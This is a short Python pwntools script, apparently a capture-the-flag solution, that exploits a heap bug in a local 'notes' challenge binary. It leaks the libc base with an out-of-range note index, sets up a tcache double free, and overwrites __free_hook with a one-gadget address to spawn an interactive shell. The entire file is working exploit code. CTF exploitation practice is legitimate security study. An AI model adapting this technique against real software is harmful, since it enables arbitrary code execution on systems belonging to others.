#!/usr/bin/python3

from pwn import *

import notes_primitives


elf = ELF('./challenge/chall')
libc = ELF('./lib/libc.so.6')
ld = ELF('./lib/ld-2.29.so')

SIZE = 0x188


def conn():
    
    if args.LOCAL:
        sh = process([elf.path])
    else:
        sh = None

    return sh


def leak_libc_base_address(primitives: notes_primitives.NotesPrimitives) -> int:
    return primitives.view_note(-2) - libc.symbols['_IO_2_1_stderr_']


def double_free_tcache(primitives: notes_primitives.NotesPrimitives) -> None:
    primitives.add_note(data=b'A' * SIZE)
    primitives.add_note(data=b'B' * SIZE)


    primitives.remove_note(1)
    primitives.remove_note(0)

    primitives.add_note(data=b'A' * (SIZE - 1))
    primitives.remove_note(1)


def write_what_where(primitives: notes_primitives.NotesPrimitives, where: int, data: bytes) -> None:
    primitives.add_note(data=p64(where), size=0x100 - 0x10)
    primitives.add_note(data=b'spam', size=SIZE)
    primitives.add_note(data=data, size=SIZE)

    
def main():
    primitives = notes_primitives.NotesPrimitives(conn())

    libc_base_address = leak_libc_base_address(primitives)

    double_free_tcache(primitives)
    write_what_where(primitives, libc_base_address + libc.symbols['__free_hook'], p64(libc_base_address + 0xe237f))

    primitives.remove_note()
    primitives.conn.interactive('')


if __name__ == "__main__":
    main()
